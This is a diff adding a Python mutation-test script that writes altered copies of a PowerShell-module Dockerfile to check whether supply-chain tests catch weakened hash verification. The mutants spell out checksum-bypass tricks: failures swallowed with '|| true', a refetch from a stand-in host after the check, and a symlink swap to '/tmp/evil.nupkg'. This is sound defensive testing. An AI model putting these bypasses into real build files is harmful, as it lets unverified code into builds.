@@ -1,0 +1,75 @@
+"""Reviewer re-review (review-u1-r1) scratch mutants: copies of docker/gates.Dockerfile
+only; the repo file is never written. Patches GATES_DOCKERFILE in the test module."""
+import io, sys, unittest
+from pathlib import Path
+REPO = Path(r"C:\repos\Knowledge-engine")
+OUT = Path(sys.argv[1]); OUT.mkdir(parents=True, exist_ok=True)
+sys.path.insert(0, str(REPO))
+import tests.test_gates_docker_cli as cli  # noqa: E402
+src = (REPO / "docker" / "gates.Dockerfile").read_text(encoding="utf-8")
+CHECK = 'echo "$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg" | sha512sum -c -; \\@@'
+UNPACK = '    python3 -I -m zipfile -e /tmp/psa.nupkg'
+FETCH_HEAD = "RUN set -eu; \\@@    curl --proto '=https' --proto-redir '=https' --tlsv1.2 -fsSL -o /tmp/psa.nupkg"
+CURL = "curl --proto '=https' --proto-redir '=https' --tlsv1.2 -fsSL"
+DOCKER_CLI_HDR = "# Docker client for the offline check"
+BS = chr(92)
+def rep(t, old, new):
+    old = old.replace('@@', chr(10)); new = new.replace('@@', chr(10))
+    assert old in t, old
+    return t.replace(old, new, 1)
+mutants = {
+  "baseline_unchanged": src,
+  # reviewer review-u1 B1 mutants, verbatim
+  "R1 check_piped_to_cat": rep(src, CHECK, 'echo "$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg" | sha512sum -c - | cat; \\@@'),
+  "R2 check_inside_if": rep(src, CHECK, 'if echo "$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg" | sha512sum -c -; then :; fi; \\@@'),
+  "R3 check_negated": rep(src, CHECK, '! echo "$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg" | sha512sum -c -; \\@@'),
+  "R4 check_backgrounded": rep(src, CHECK, 'echo "$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg" | sha512sum -c - & \\@@'),
+  "R5 set_plus_e_before_check": rep(src, FETCH_HEAD, FETCH_HEAD.replace("RUN set -eu; \\@@", "RUN set -eu; set +e; \\@@")),
+  "R6 refetch_after_check": rep(src, UNPACK, f'    {CURL} -o /tmp/psa.nupkg "https://example.invalid/x.nupkg"; \\@@' + UNPACK),
+  # new attempts (r1)
+  "N1 check_names_prefix_twin (good file fetched first as /tmp/psa.nupkg.ok, check reads it)":
+      rep(rep(src, FETCH_HEAD, FETCH_HEAD.replace("RUN set -eu; \\@@",
+          f"RUN set -eu; \\@@    {CURL} -o /tmp/psa.nupkg.ok \"https://example.invalid/good.nupkg\"; \\@@")),
+          CHECK, 'echo "$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg.ok" | sha512sum -c -; \\@@'),
+  "N2 check_via_function_or_true": rep(src, CHECK, 'chk() { echo "$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg" | sha512sum -c -; }; chk || true; \\@@'),
+  "N3 check_in_sh_c_or_true": rep(src, CHECK, 'sh -c \'echo "$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg" | sha512sum -c -\' || true; \\@@'),
+  "N4 set_minus_u_plus_e (combined word)": rep(src, FETCH_HEAD, FETCH_HEAD.replace("RUN set -eu; \\@@", "RUN set -eu; set -u +e; \\@@")),
+  "N5 env_prefixed_check_or_colon": rep(src, CHECK, 'echo "$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg" | sha512sum -c - || :; \\@@'),
+  "N6 symlink_swap_after_check": rep(src, UNPACK, '    ln -sf /tmp/evil.nupkg /tmp/psa.nupkg; \\@@' + UNPACK),
+  "N7 later_RUN_overwrites_module_dir_unchecked": rep(src, DOCKER_CLI_HDR,
+      f"RUN set -eu; {CURL} -o /tmp/x.nupkg \"https://example.invalid/x.nupkg\"; \\@@"
+      "    python3 -I -m zipfile -e /tmp/x.nupkg \"/usr/local/share/powershell/Modules/PSScriptAnalyzer/${PSSCRIPTANALYZER_VERSION}\"; rm /tmp/x.nupkg\n@@" + DOCKER_CLI_HDR),
+}
+# reasonable future edits: must NOT be rejected (false-positive probe)
+benign = {
+  "B1 check --strict --quiet": rep(src, CHECK, 'echo "$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg" | sha512sum --check --strict --quiet -; \\@@'),
+  "B2 printf instead of echo": rep(src, CHECK, "printf '%s  %s' \"$PSSCRIPTANALYZER_SHA512\" /tmp/psa.nupkg | sha512sum -c -; \\@@"),
+  "B3 mkdir -p module dir between check and unpack": rep(src, UNPACK, '    mkdir -p "$dir"; \\@@' + UNPACK),
+  "B4 2>&1 on curl": rep(src, "-o /tmp/psa.nupkg \\@@", "-o /tmp/psa.nupkg 2>&1 \\@@"),
+  "B5 arch case before the fetch": rep(src, FETCH_HEAD, FETCH_HEAD.replace("RUN set -eu; \\@@",
+      'RUN set -eu; \\@@    case "$(dpkg --print-architecture)" in amd64|arm64) : ;; *) exit 1 ;; esac; \\@@')),
+  "B6 check output to /dev/null": rep(src, CHECK, 'echo "$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg" | sha512sum -c - >/dev/null; \\@@'),
+  "B7 checksum file instead of stdin": rep(src, CHECK, 'echo "$PSSCRIPTANALYZER_SHA512  /tmp/psa.nupkg" > /tmp/psa.sha512; sha512sum -c /tmp/psa.sha512; \\@@'),
+}
+names = ["test_gates_image_sets_telemetry_optout_before_pwsh", "test_gates_image_verifies_psscriptanalyzer_hash", "test_gates_image_psscriptanalyzer_version_agrees"]
+def run(name, text):
+    p = OUT / (name.split()[0] + ".Dockerfile"); p.write_text(text, encoding="utf-8")
+    cli.GATES_DOCKERFILE = p
+    suite = unittest.TestSuite(cli.GatesImagePowerShellSupplyChainTest(n) for n in names)
+    r = unittest.TextTestRunner(stream=io.StringIO(), verbosity=0).run(suite)
+    return r
+survived = 0
+for name, text in mutants.items():
+    r = run(name, text); bad = len(r.failures) + len(r.errors)
+    if name.startswith("baseline"):
+        print(f"{name}: {'PASS' if bad == 0 else f'FAIL ({bad})'}")
+    else:
+        survived += bad == 0
+        print(f"{name}: {'SURVIVED' if bad == 0 else f'KILLED ({bad})'}")
+    for t, _ in r.failures + r.errors: print("    ", t)
+print(f"mutants: {len(mutants)-1}, survived: {survived}")
+print("--- benign edits (false-positive probe) ---")
+for name, text in benign.items():
+    r = run(name, text); bad = len(r.failures) + len(r.errors)
+    print(f"{name}: {'ACCEPTED' if bad == 0 else f'REJECTED ({bad})'}")
+    for t, tb in r.failures + r.errors: print("    ", t, "|", tb.strip().splitlines()[-1][:220])
